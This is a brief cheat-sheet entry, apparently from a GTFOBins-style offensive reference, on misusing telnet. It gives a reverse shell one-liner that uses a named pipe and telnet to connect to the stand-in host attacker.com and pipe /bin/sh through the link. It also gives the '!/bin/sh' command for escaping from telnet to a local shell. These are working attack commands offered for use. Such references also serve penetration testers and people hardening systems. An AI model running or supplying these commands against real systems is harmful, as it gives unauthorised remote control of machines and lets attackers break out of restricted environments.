title: telnet
html:
telnet

Reverse Shell

The shell process is not spawn by `openssl`.

mkfifo /path/to/temp-socket
telnet attacker.com 12345 </path/to/temp-socket | /bin/sh >/path/to/temp-socket

Shell

telnet
!/bin/sh
